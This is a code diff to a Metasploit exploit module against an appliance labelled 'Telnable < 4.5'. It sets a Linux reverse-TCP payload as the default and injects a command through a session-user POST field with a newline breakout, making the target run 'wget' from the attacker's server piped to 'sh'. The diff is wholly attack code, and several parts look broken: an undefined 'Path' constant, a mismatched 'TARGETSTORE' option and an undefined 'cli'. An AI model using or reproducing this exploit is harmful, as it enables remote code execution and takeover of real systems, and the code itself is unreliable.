@@ -32,13 +32,19 @@ class MetasploitModule < Msf::Exploit::Remote
       'Targets'        => [
         ['Telnable < 4.5', {}]
       ],
-      'DefaultTarget'  => 0
+      'DefaultTarget'  => 0,
+      'DefaultOptions'  =>
+        {
+          'PAYLOAD' => 'linux/x86/mettle_reverse_tcp'
+        }
     ))
 
     register_options([
       Opt::RPORT(8000),
       OptString.new('TARGETURI', [true, 'The URI of the vulnerable application', '/simpleupload.py'])
     ])
+
+    deregister_options('URIPATH')
   end
 
   def check
@@ -46,22 +52,29 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def exploit
-    print_status("Injecting payload...")
-    execute_cmdstager(flavor: :bourne)
-  end
 
-  def execute_command(cmd, opts = {})
+    @cmdstager = generate_cmdstager(flavor: :wget, Path => '/')
+
     uri = normalize_uri(datastore['TARGETSTORE'])
     send_request_cgi({
         'uri'       => uri,
-        'method'    => 'POST'
+        'method'    => 'POST',
         'vars_post' => {
           'returnpage'                  => '/',
           'action'                      => 'a',
           'tns_appliance_session_token' => '61:62',
-          'tns_appliance_session_user'  => "a\"'%0a#{cmd}"
+          'tns_appliance_session_user'  => "a\"\'\nwget -O- '#{srvhost_addr}:#{srvhost_port}' | sh"
         }
     })
+  end
+
+  def on_request_uri(cmd, request)
+    if @cmdstager
+      send_response(cli, @cmdstager)
+      @cmdstager = nil
+    else
+      super
+    end
   end 
     
 end
